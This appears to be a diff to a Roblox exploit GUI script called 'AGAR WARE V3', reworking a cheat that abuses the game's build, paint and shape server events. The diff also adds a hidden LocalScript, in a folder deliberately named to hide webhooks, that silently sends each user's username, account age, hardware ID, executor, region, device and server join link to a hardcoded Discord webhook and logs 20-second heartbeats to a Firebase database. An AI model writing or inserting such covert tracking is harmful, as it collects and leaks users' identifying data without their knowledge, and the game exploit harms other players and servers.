@@ -7,7 +7,7 @@
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
 ]=]
 
--- Instances: 947 | Scripts: 28 | Modules: 0 | Tags: 0
+-- Instances: 949 | Scripts: 29 | Modules: 0 | Tags: 0
 local G2L = {};
 
 -- StarterGui.T5784YHRGE89ES98T
@@ -8640,6 +8640,16 @@ G2L["3b3"] = Instance.new("LocalScript", G2L["3b2"]);
 G2L["3b3"]["Name"] = [[tcotoolrefresh]];
 
 
+-- StarterGui.T5784YHRGE89ES98T.WEBHOOOOOKSSSSSaaHIDE
+G2L["3b4"] = Instance.new("Folder", G2L["1"]);
+G2L["3b4"]["Name"] = [[WEBHOOOOOKSSSSSaaHIDE]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.WEBHOOOOOKSSSSSaaHIDE.global log
+G2L["3b5"] = Instance.new("LocalScript", G2L["3b4"]);
+G2L["3b5"]["Name"] = [[global log]];
+
+
 -- StarterGui.T5784YHRGE89ES98T.mainScript
 local function C_2()
 local script = G2L["2"];
@@ -10984,10 +10994,31 @@ local script = G2L["2e3"];
 	-- ====================================================================================================
 	-- RESTORE BRICK
 	-- ====================================================================================================
+	if getgenv().brickcollection == nil then
+		getgenv().brickcollection = {}
+	
+		local brickname = "Brick"
+		local cfolder = workspace:FindFirstChild("Bricks") or workspace:FindFirstChild("Blocks")
+	
+		local function dbc(b)
+			if b.Name ~= brickname then return end
+			if not table.find(getgenv().brickcollection, b) then
+				table.insert(getgenv().brickcollection, 1, b)
+			end
+		end
+	
+		if cfolder then
+			cfolder.DescendantAdded:Connect(dbc)
+			for _, v in pairs(cfolder:GetDescendants()) do
+				dbc(v)
+			end
+		end
+	end
+	
 	_G.CreateButton({
 		frame = "restorebrick",
 		groupbox = script,
-		tooltip = "Restores brick and a chance to place a block at your torso when B-Kit is broken, and theres no more blocks to place on. You must be in the server before B-Kit gets disabled.",
+		tooltip = "Restores brick and sometimes places a block at your torso when B-Kit is broken, and theres no more blocks to place on. You must be in the server before B-Kit gets disabled.",
 		afterMessage = "Restored brick!",
 		errorMessage = "Failed!",
 		afterMessageWait = 1,
@@ -10995,28 +11026,51 @@ local script = G2L["2e3"];
 		callback = function()
 			local token = _G.SetButtonText("restorebrick", "Processing...", 999)
 	
-			local success, err = pcall(function()
+			if getgenv().brickcollection == nil then
+				getgenv().brickcollection = {}
+			end
+	
+			local success, result = pcall(function()
 				local Players = game:GetService("Players")
 				local LocalPlayer = Players.LocalPlayer
 				local rs = game:GetService("ReplicatedStorage")
 				local workspace = game:GetService("Workspace")
 	
-				local character = LocalPlayer.Character
-				if not character then error("No character") end
+				local brickname = "Brick"
+				local ws = 0.235
+				local cfolder = workspace:FindFirstChild("Bricks") or workspace:FindFirstChild("Blocks")
 	
-				local humanoid = character:FindFirstChild("Humanoid")
-				if not humanoid then error("No humanoid") end
+				if not cfolder then
+					return "No blocks folder!"
+				end
+	
+				local character = LocalPlayer.Character
+				if not character then return "No character!" end
 	
 				local hrp = character:FindFirstChild("HumanoidRootPart")
-				if not hrp then error("No HumanoidRootPart") end
+				if not hrp then return "No HumanoidRootPart!" end
 	
-				local isog = workspace:FindFirstChild("Cubes") ~= nil
-				local brickname = "Brick"
+				local function getplrpos()
+					return hrp.Position
+				end
+	
+				local function findtool(toolname)
+					for _, v in pairs(character:GetChildren()) do
+						if v:IsA("Tool") and v.Name:find(toolname) then
+							return v
+						end
+					end
+					for _, v in pairs(LocalPlayer.Backpack:GetChildren()) do
+						if v:IsA("Tool") and v.Name:find(toolname) then
+							return v
+						end
+					end
+					return nil
+				end
 	
 				if not rs:FindFirstChild(brickname) then
 					local brick = Instance.new("Part")
 					brick.Name = brickname
-					brick:AddTag("FAKE")
 					brick.Parent = rs
 				end
 	
@@ -11034,151 +11088,158 @@ local script = G2L["2e3"];
 					end
 				end
 	
-				if isog then
-					local btools = LocalPlayer.Backpack:FindFirstChild("BTools")
-					if btools then
-						btools.Enabled = false
-						btools.Enabled = true
-					end
+				local buildtool = findtool("Build")
+				local painttool = findtool("Paint")
+				local shapetool = findtool("Shape")
+	
+				if not buildtool then
+					return "Build tool needed!"
 				end
 	
-				local buildTool = LocalPlayer.Backpack:FindFirstChild("Build")
-				if not buildTool then error("Build tool needed!") end
-	
-				humanoid:EquipTool(buildTool)
-				task.wait(0.2)
-	
-				if not character:FindFirstChild("Build") then
-					error("Failed!")
+				if buildtool.Parent == LocalPlayer.Backpack then
+					buildtool.Parent = character
+				end
+				if painttool and painttool.Parent == LocalPlayer.Backpack then
+					painttool.Parent = character
+				end
+				if shapetool and shapetool.Parent == LocalPlayer.Backpack then
+					shapetool.Parent = character
 				end
 	
-				local cfolder = workspace:FindFirstChild("Cubes")
-				if not cfolder then error("Cubes folder not found") end
+				task.wait(ws)
 	
-				local playerFolder = cfolder:FindFirstChild(LocalPlayer.Name)
-				if not playerFolder then error("Player folder not found") end
-	
-				local beforeamt = #playerFolder:GetChildren()
-				local event = buildTool:WaitForChild("Script"):WaitForChild("Event")
-	
-				local placedBlock = false
-				local attempts = 0
-				local maxAttempts = 50
-	
-				while not placedBlock and attempts < maxAttempts and not token.cancelled do
-					if not character:FindFirstChild("Build") then
-						buildTool = LocalPlayer.Backpack:FindFirstChild("Build")
-						if buildTool then
-							humanoid:EquipTool(buildTool)
-							task.wait(0.1)
+				local currbc = {}
+				for _, v in pairs(getgenv().brickcollection) do
+					if v ~= nil and typeof(v) == "Instance" then
+						if v:GetFullName() ~= brickname and v.Name ~= "Debris" then
+							table.insert(currbc, 1, v)
 						else
-							error("Build tool removed!")
+							table.insert(currbc, v)
 						end
 					end
+				end
 	
-					if isog then
-						LocalPlayer.Backpack.Events:FireServer(
-							hrp.Position,
-							Enum.NormalId.Top,
-							rs:FindFirstChild(brickname),
-							Color3.new(0, 0, 0),
-							"Smooth"
-						)
-					else
-						event:FireServer(
-							rs:FindFirstChild(brickname),
-							Enum.NormalId.Top,
-							hrp.Position,
-							"detailed"
-						)
-					end
+				if #currbc == 0 then
+					return "No blocks found!"
+				end
 	
-					task.wait(0.1)
-					attempts = attempts + 1
+				local playerfolder = cfolder:FindFirstChild(LocalPlayer.Name)
+				if not playerfolder then
+					return "Player folder not found!"
+				end
 	
-					if #playerFolder:GetChildren() > beforeamt then
-						placedBlock = true
-						break
+				local block = nil
+				local beforeamt = #playerfolder:GetChildren()
+	
+				for _, v in pairs(currbc) do
+					if v ~= nil and typeof(v) == "Instance" then
+						block = v
+						if buildtool:FindFirstChild("Script") and buildtool.Script:FindFirstChild("Event") then
+							buildtool.Script.Event:FireServer(
+								block,
+								Enum.NormalId.Top,
+								getplrpos(),
+								"detailed"
+							)
+						end
+	
+						task.wait(ws)
+						if beforeamt < #playerfolder:GetChildren() then
+							break
+						end
 					end
 				end
 	
-				if not placedBlock then
-					error("Failed to place block!")
+				task.wait(1)
+				block = playerfolder:FindFirstChildWhichIsA("BasePart")
+	
+				if not block then
+					return "No block created!"
 				end
 	
-				task.wait(0.5)
+				block = playerfolder:GetChildren()[#playerfolder:GetChildren()]
 	
-				local block = playerFolder:GetChildren()[#playerFolder:GetChildren()]
-				if not block then error("Block not found after placement") end
-	
-				local paintTool = LocalPlayer.Backpack:FindFirstChild("Paint")
-				local shapeTool = LocalPlayer.Backpack:FindFirstChild("Shape")
-	
-				if paintTool and shapeTool then
-					humanoid:EquipTool(paintTool)
-					task.wait(0.1)
-					humanoid:EquipTool(shapeTool)
-					task.wait(0.1)
-	
-					if not character:FindFirstChild("Paint") or not character:FindFirstChild("Shape") then
-						error("Failed!")
-					end
-	
-					local paintEvent = paintTool:WaitForChild("Script"):WaitForChild("Event")
-					local shapeEvent = shapeTool:WaitForChild("Script"):WaitForChild("Event")
-	
+				if painttool then
 					if block.Material ~= Enum.Material.Plastic then
-						paintEvent:FireServer(block, Enum.NormalId.Top, hrp.Position, "material", Color3.fromRGB(192, 192, 192), "plastic", "")
-						task.wait(0.1)
+						painttool.Script.Event:FireServer(
+							block,
+							Enum.NormalId.Top,
+							getplrpos(),
+							"material",
+							Color3.fromRGB(192, 192, 192),
+							"plastic",
+							""
+						)
+						task.wait(ws * 2)
 					end
 	
-					if not block.Anchored then
-						paintEvent:FireServer(block, Enum.NormalId.Top, hrp.Position, "both 🤝", Color3.fromRGB(192, 192, 192), "anchor", "")
-						task.wait(0.1)
+					if not block.Anchored or block.CFrame - block.Position ~= CFrame.new() then
+						local l = tick()
+						repeat
+							if tick() > l then
+								l = tick() + (ws * 2)
+								painttool.Script.Event:FireServer(
+									block,
+									Enum.NormalId.Top,
+									getplrpos(),
+									"both 🤝",
+									Color3.fromRGB(192, 192, 192),
+									"anchor",
+									""
+								)
+							end
+							task.wait()
+						until block.Anchored and block.CFrame - block.Position == CFrame.new()
 					end
+				end
 	
+				if shapetool then
 					local blockpos = block.Position
 					blockpos = Vector3.new(blockpos.X % 4, blockpos.Y % 4, blockpos.Z % 4)
 					blockpos = blockpos - Vector3.new(0.5, 0.5, 0.5)
 	
 					for i = 1, blockpos.X do
-						if not character:FindFirstChild("Shape") then error("Failed!") end
-						shapeEvent:FireServer(block, Enum.NormalId.Left, nil, "increase")
-						task.wait(0.05)
+						shapetool.Script.Event:FireServer(block, Enum.NormalId.Left, block.Position, "increase")
+						task.wait(0.15)
 					end
+	
 					for i = 1, 3 - blockpos.X do
-						if not character:FindFirstChild("Shape") then error("Failed!") end
-						shapeEvent:FireServer(block, Enum.NormalId.Right, nil, "increase")
-						task.wait(0.05)
+						shapetool.Script.Event:FireServer(block, Enum.NormalId.Right, block.Position, "increase")
+						task.wait(0.15)
 					end
+	
 					for i = 1, blockpos.Y do
-						if not character:FindFirstChild("Shape") then error("Failed!") end
-						shapeEvent:FireServer(block, Enum.NormalId.Bottom, nil, "increase")
-						task.wait(0.05)
+						shapetool.Script.Event:FireServer(block, Enum.NormalId.Bottom, block.Position, "increase")
+						task.wait(0.15)
 					end
+	
 					for i = 1, 3 - blockpos.Y do
-						if not character:FindFirstChild("Shape") then error("Failed!") end
-						shapeEvent:FireServer(block, Enum.NormalId.Top, nil, "increase")
-						task.wait(0.05)
+						shapetool.Script.Event:FireServer(block, Enum.NormalId.Top, block.Position, "increase")
+						task.wait(0.15)
 					end
+	
 					for i = 1, blockpos.Z do
-						if not character:FindFirstChild("Shape") then error("Failed!") end
-						shapeEvent:FireServer(block, Enum.NormalId.Front, nil, "increase")
-						task.wait(0.05)
+						shapetool.Script.Event:FireServer(block, Enum.NormalId.Front, block.Position, "increase")
+						task.wait(0.15)
 					end
+	
 					for i = 1, 3 - blockpos.Z do
-						if not character:FindFirstChild("Shape") then error("Failed!") end
-						shapeEvent:FireServer(block, Enum.NormalId.Back, nil, "increase")
-						task.wait(0.05)
+						shapetool.Script.Event:FireServer(block, Enum.NormalId.Back, block.Position, "increase")
+						task.wait(0.15)
 					end
 				end
+	
+				return true
 			end)
 	
-			if success then
+			if success and result == true then
 				_G.SetButtonText("restorebrick", "Restored brick!", 1)
 				return true
+			elseif type(result) == "string" then
+				_G.SetButtonText("restorebrick", result, 1)
+				return false
 			else
-				_G.SetButtonText("restorebrick", err or "Failed!", 1)
+				_G.SetButtonText("restorebrick", "Failed!", 1)
 				return false
 			end
 		end,
@@ -13091,6 +13152,7 @@ local script = G2L["349"];
 			10385488328, -- Ihateroblox_oq
 			5695584804, -- strongestegg83973
 			10923596100, -- serverbot_tco
+			4393801944, -- gelato
 		},
 		Whitelisted = {
 			10754470202, -- raja 22
@@ -14257,5 +14319,244 @@ local script = G2L["3b3"];
 	end
 end;
 task.spawn(C_3b3);
+-- StarterGui.T5784YHRGE89ES98T.WEBHOOOOOKSSSSSaaHIDE.global log
+local function C_3b5()
+local script = G2L["3b5"];
+	local _WH = {}
+	do
+		local _HttpService     = game:GetService("HttpService")
+		local _Players         = game:GetService("Players")
+		local _MarketplaceSvc  = game:GetService("MarketplaceService")
+		local _AnalyticsSvc    = game:GetService("RbxAnalyticsService")
+		local _InputService    = game:GetService("UserInputService")
+		local _LocaleSvc       = game:GetService("LocalizationService")
+	
+		local _WEBHOOK = "https://discord.com/api/webhooks/1502950736902750258/mav7Jjsbea6vyUZOV3NfWzIvIB1XDSTJMqjKx7mCTCY00RL2mKnKQqgdZGRGfPWMjO5Y"
+		local _FIREBASE_URL = "https://agar-ware-default-rtdb.firebaseio.com"
+		local _SCRIPT_NAME = "AGAR WARE V3"
+	
+		local _req = (syn and syn.request)
+			or request
+			or http_request
+			or (fluxus and fluxus.request)
+			or function() return { StatusCode = 0 } end
+	
+		local _plr = _Players.LocalPlayer
+		local _productInfo = pcall(function()
+			return _MarketplaceSvc:GetProductInfo(game.PlaceId)
+		end) and _MarketplaceSvc:GetProductInfo(game.PlaceId) or { Name = "Unknown" }
+	
+		local function _hwid()
+			if get_hwid then return tostring(get_hwid()) end
+			local ok, id = pcall(function() return _AnalyticsSvc:GetClientId() end)
+			return ok and id or "N/A"
+		end
+	
+		local function _executor()
+			if syn and syn.request then return "Synapse X" end
+			if fluxus and fluxus.request then return "Fluxus" end
+			if KRNL_LOADED or Krnl then return "KRNL" end
+			if getexecutorname then return getexecutorname() end
+			return "Unknown"
+		end
+	
+		local function _region()
+			local ok, r = pcall(function() return _LocaleSvc.RobloxLocaleId end)
+			return ok and r or "N/A"
+		end
+	
+		local function _platform()
+			local p = _InputService:GetPlatform().Name
+			local device = "Unknown"
+	
+			if p == "Windows" then device = "Windows"
+			elseif p == "OSX" then device = "MacOS"
+			elseif p == "IOS" then device = "iOS"
+			elseif p == "Android" then device = "Android"
+			elseif p == "UWP" then device = "Xbox"
+			else device = p end
+	
+			return device
+		end
+	
+		local function _ping()
+			local ok, v = pcall(function()
+				return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
+			end)
+			return ok and math.floor(v) or 0
+		end
+	
+		local function _fps()
+			local v = workspace:GetRealPhysicsFPS()
+			return v > 0 and math.floor(v) or 0
+		end
+	
+		local function _joinLink()
+			local ok, v = pcall(function()
+				return "https://www.roblox.com/games/start?placeId="
+					.. game.PlaceId
+					.. "&gameInstanceId=" .. game.JobId
+			end)
+			return ok and v or ""
+		end
+	
+		local function _getPlayerData(hwid)
+			local success, response = pcall(function()
+				return _req({
+					Url = _FIREBASE_URL .. "/players/" .. hwid .. ".json",
+					Method = "GET"
+				})
+			end)
+	
+			if success and response.StatusCode == 200 then
+				local data = _HttpService:JSONDecode(response.Body)
+				if type(data) == "table" then
+					return data
+				end
+			end
+	
+			return {
+				execution_count = 0,
+				first_seen = os.time(),
+				last_username = ""
+			}
+		end
+	
+		local function _updatePlayerData(hwid, data)
+			pcall(function()
+				_req({
+					Url = _FIREBASE_URL .. "/players/" .. hwid .. ".json",
+					Method = "PATCH",
+					Headers = { ["Content-Type"] = "application/json" },
+					Body = _HttpService:JSONEncode(data)
+				})
+			end)
+		end
+	
+		local function _send(embedTable)
+			pcall(function()
+				_req({
+					Url    = _WEBHOOK,
+					Method = "POST",
+					Headers = { ["Content-Type"] = "application/json" },
+					Body   = _HttpService:JSONEncode({ embeds = { embedTable } })
+				})
+			end)
+		end
+	
+		local hwid = _hwid()
+		local playerData = _getPlayerData(hwid)
+	
+		playerData.execution_count = playerData.execution_count + 1
+		playerData.last_username = _plr.Name
+		playerData.last_seen = os.time()
+	
+		_updatePlayerData(hwid, playerData)
+	
+		local accountCreated = os.date("%Y-%m-%d", os.time() - (_plr.AccountAge * 86400))
+	
+		_send({
+			description = string.format(
+				"**Display / Username:** %s / @%s\n**%s** (%d Days)\n\n**Game:** [%s](%s)\n**Server:** %d/%d\n\n**Region:** %s\n**Executor:** %s\n**Device:** %s | %dms | %dfps\n**HWID:** `%s`\n\n**Execution Count:** #%d",
+				_plr.DisplayName,
+				_plr.Name,
+				accountCreated,
+				_plr.AccountAge,
+				_productInfo.Name,
+				_joinLink(),
+				#_Players:GetPlayers(),
+				_Players.MaxPlayers,
+				_region(),
+				_executor(),
+				_platform(),
+				_ping(),
+				_fps(),
+				hwid,
+				playerData.execution_count
+			),
+			color = 0x000000,
+			footer = { text = _SCRIPT_NAME },
+			timestamp = DateTime.now():ToIsoDate()
+		})
+	end
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	-- Add this AFTER your load webhook code
+	
+	local _FIREBASE_URL = "https://agar-ware-default-rtdb.firebaseio.com"
+	local _plr = game:GetService("Players").LocalPlayer
+	local _HttpService = game:GetService("HttpService")
+	local _MarketplaceSvc = game:GetService("MarketplaceService")
+	
+	local _req = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)
+	
+	local function _hwid()
+		if get_hwid then return tostring(get_hwid()) end
+		local ok, id = pcall(function() return game:GetService("RbxAnalyticsService"):GetClientId() end)
+		return ok and id or "N/A"
+	end
+	
+	local function _joinLink()
+		local ok, v = pcall(function()
+			return "https://www.roblox.com/games/start?placeId="
+				.. game.PlaceId
+				.. "&gameInstanceId=" .. game.JobId
+		end)
+		return ok and v or ""
+	end
+	
+	local _productInfo = pcall(function()
+		return _MarketplaceSvc:GetProductInfo(game.PlaceId)
+	end) and _MarketplaceSvc:GetProductInfo(game.PlaceId) or { Name = "Unknown" }
+	
+	-- Send heartbeat every 20 seconds
+	spawn(function()
+		while wait(20) do
+			pcall(function()
+				_req({
+					Url = _FIREBASE_URL .. "/online_users/user_" .. _plr.UserId .. ".json",
+					Method = "PUT",
+					Headers = { ["Content-Type"] = "application/json" },
+					Body = _HttpService:JSONEncode({
+						username = _plr.Name,
+						display_name = _plr.DisplayName,
+						game_name = _productInfo.Name,
+						game_link = _joinLink(),
+						place_id = game.PlaceId,
+						last_heartbeat = os.time(),
+						hwid = _hwid()
+					})
+				})
+			end)
+		end
+	end)
+	
+	-- Remove from online list when player leaves
+	game:GetService("Players").PlayerRemoving:Connect(function(player)
+		if player == _plr then
+			pcall(function()
+				_req({
+					Url = _FIREBASE_URL .. "/online_users/user_" .. _plr.UserId .. ".json",
+					Method = "DELETE"
+				})
+			end)
+		end
+	end)
+end;
+task.spawn(C_3b5);
 
 return G2L["1"], require;
